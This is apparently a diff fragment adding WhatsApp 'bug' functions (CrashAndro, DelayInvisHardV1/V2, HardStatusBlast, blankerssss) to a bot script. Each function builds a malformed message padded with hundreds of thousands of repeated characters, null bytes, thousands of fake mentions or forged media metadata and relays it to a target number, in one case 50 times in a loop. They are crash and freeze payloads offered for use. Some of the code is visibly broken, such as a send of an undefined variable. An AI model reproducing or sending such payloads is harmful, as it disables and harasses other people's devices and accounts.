+      participant: { jid: target }
+    });
+
+    console.log(`Sukses Mengirim Bug Ke : ${target}`);
+  } catch (err) {
+    console.error(`Error : ${err.message}`);
+  }
+}
+
+async function CrashAndro(sock, target) {
+    const ShinMsg = {
+    interactiveMessage: {
+      header: {
+      title: "Yth ShinOffical"
+    },
+    body: {
+      text: "Mak Loh Hama".repeat(10000) + "ꦾ".repeat(30000)
+    },
+    nativeFlowMessage: {
+      messagePramsJson: "{".repeat(30000),
+        buttons: [
+          {
+            name: "galaxy_message",
+              buttonParamsJson: JSON.stringify({
+                icon: "ꦾ".repeat(10000),
+                flow_cta: "ꦽ".repeat(10000),
+                flow_message_version: "3"
+              })
+            }
+          ]
+        }
+      }
+    }
+        
+    console.log(chalk.green(`Sukses Bug : ${target}`))
+    
+  await sock.relayMessage(target, ShinMsg, {
+    participant: { jid: target },
+  });
+}
+
+async function DelayInvisHardV1(sock, target) {
+  try {
+    const ShinMsg = {
+      groupStatusMessageV2: {
+        message: {
+          interactiveResponseMessage: {
+            body: {
+              text: "Yth Shin",
+              format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+              name: "cta_url",
+              paramsJson: {"flow_cta":"${"\u0000".repeat(999999) + "\n"}"},
+            },
+            disappearingMode: {
+              initiator: "CHANGED_IN_CHAT",
+              trigger: "\u200b/\n/\u300b"
+            }
+          }
+        }
+      }
+    };
+    
+    await sock.relayMessage(target, Msg1, {
+      participant: { jid: target }
+    });
+    
+    console.log(`Sukses Mengirim Bug Ke : ${target}`);
+  } catch (err) {
+    console.error(`Error : ${err.message}`);
+  }
+}
+
+async function DelayInvisHardV2(sock, target) {
+  try {
+    const Mentions = [
+      "0@s.whatsapp.net",
+      ...Array.from({ length: 5000 }, () =>
+        Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
+      )
+    ];
+    
+    const ShinMsg = {
+      groupStatusMessageV2: {
+        message: {
+          interactiveResponseMessage: {
+            body: {
+              text: "Kenal Shin Gak ?" + "ꦽ".repeat(100000),
+              format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+              name: "cta_url",
+              paramsJson: {"flow_cta":"${"\u0000".repeat(9999) + "\n" + "\u200B".repeat(9999) + "\u600B".repeat(9999)}"},
+            },
+            disappearingMode: {
+              initiator: "CHANGED_IN_CHAT",
+              trigger: "\u200b"
+            },
+            contextInfo: {
+              mentionedJid: Mentions,
+                stanzaId: "\u0000".repeat(20000),
+                  quotedMessage: {
+                  interactiveResponseMessage: {
+                  body: {
+                    text: "Shin Is Here"
+                  },
+                  nativeFlowResponseMessage: {
+                    name: "\u200B".repeat(30000),
+                    paramsJson: {"loop":"${"\u0000".repeat(70000)}"},
+                    contextInfo: {
+                      quotedMessage: {
+                        interactiveResponseMessage: {
+                          body: {
+                            text: "ꦽ".repeat(40000)
+                          }
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    };
+        
+    await sock.relayMessage(target, ShinMsg, {
+      participant: { jid: target }
+    });
+    
+    console.log(`Sukses Mengirim Bug Ke : ${target}`);
+    
+    } catch (err) {
+        console.error(`Error : ${err.message}`);
+    }
+}
+
+async function HardStatusBlast(sock, target) {
+    try {
+        const payloadBeta = {
+            viewOnceMessage: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: " #-Maklu",
+                            format: "DEFAULT"
+                        },
+                        nativeFlowResponseMessage: {
+                            name: "call_permission_request",
+                            paramsJson: " ".repeat(1045000),
+                            version: 3
+                        },
+                        entryPointConversionSource: "galaxy_message",
+                    }
+                }
+            }
+        };
+
+        const payloadGamma = {
+            stickerMessage: {
+                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
+                fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
+                fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
+                mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
+                mimetype: "image/webp",
+                height: 9999,
+                width: 9999,
+                directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
+                fileLength: 999999,
+                mediaKeyTimestamp: "1743832131",
+                isAnimated: false,
+                stickerSentTs: "X",
+                isAvatar: false,
+                isAiSticker: false,
+                isLottie: false,
+                contextInfo: {
+                    mentionedJid: [
+                        "0@s.whatsapp.net",
+                        ...Array.from({ length: 1999 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
+                    ],
+                    stanzaId: "1234567890ABCDEF",
+                    quotedMessage: {
+                        paymentInviteMessage: {
+                            serviceType: 3,
+                            expiryTimestamp: Date.now() + 1814400000
+                        }
+                    }
+                }
+            }
+        };
+
+        for (let i = 0; i < 50; i++) {
+            await sock.sendMessage(target, payloadBeta, { statusBroadcast: true });
+            await sock.sendMessage(target, payloadGamma, { statusBroadcast: true });
+            await new Promise(r => setTimeout(r, 2500));
+        }
+        console.log("SUCCES SENDING BUG");
+    } catch (err) { console.error("Error:", err.message); }
+}
+
+async function blankerssss(sock, target) {
+  try {
+    const ChaosSeed = "ꦾ".repeat(2000000);
+    
+    const VoidMessage = {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              documentMessage: {
+                url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
+                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
+                fileLength: "999999999999",
+                pageCount: 1316134911,
+                fileLength: 9999999999,
+                height: 999999999,
+                mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
+                fileName: "NT BRO" + "ꦾ".repeat(60000),
+                fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
+                directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
+                mediaKeyTimestamp: "1743848703"
+              }
+            },
+            nativeFlowMessage: {
+              buttons: [
+                {
+                  name: "cta_call",
+                  buttonParamsJson: "ꦾ".repeat(6000)
+                },
+                {
+                  name: "cta_copy",
+                  buttonParamsJson: "ꦾ".repeat(6000)
+                }
+              ]
+            },
+            newsletterAdminInviteMessage: {},
+            scheduledCallCreationMessage: {
+              callType: "VIDEO",
+              scheduledTimestampMs: Date.now() + 1000,
+              title: "OVALIUM IS HERE" + "ꦽ".repeat(1000),
+              inviteCode: "t.me/Xwarrxxx",
+              contextInfo: {
+                isForwarded: true,
+                forwardingScore: 999,
+                businessMessageForwardInfo: {
+                  businessOwnerJid: "1975@s.whatsapp.net",
+                },
+                quotedMessage: {
+                  paymentInviteMessage: {
+                    serviceType: 1,
+                    expiryTimestamp: null,
+                  }
+                },
+                externalAdReply: {
+                  renderLargerThumbnail: true,
+                  showAdAttribution: true,
+                  body: "ꦾ".repeat(35000),
+                  title: "ི꒦ྀ".repeat(9000),
+                  sourceUrl: "https://t.me/Xwarrxxx" + "ི꒦ྀ".repeat(9000) + "\u0000",
+                  thumbnailUrl: null,
+                  quotedAd: {
+                    advertiserName: "ི꒦ྀ".repeat(9000),
+                    mediaType: 2,
+                    jpegThumbnail: "/9j/4AAKossjsls7920ljspLli",
+                    caption: "Fuck You",
+                  },
+                  pleaceKeyHolder: {
+                    remoteJid: "0@s.whatsapp.net",
+                    fromMe: false,
+                    id: "XXNXXX",
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    };
+    
+    await sock.relayMessage(target, VoidMessage, {
+      messageId: null,
+      participant: { jid: target },
+    });
+
+  } catch (err) {
+    console.error(`‼️ : ${err.message}`);
+  }
+}
 ///========[ END FUN ]=====\\\
 bot.launch()
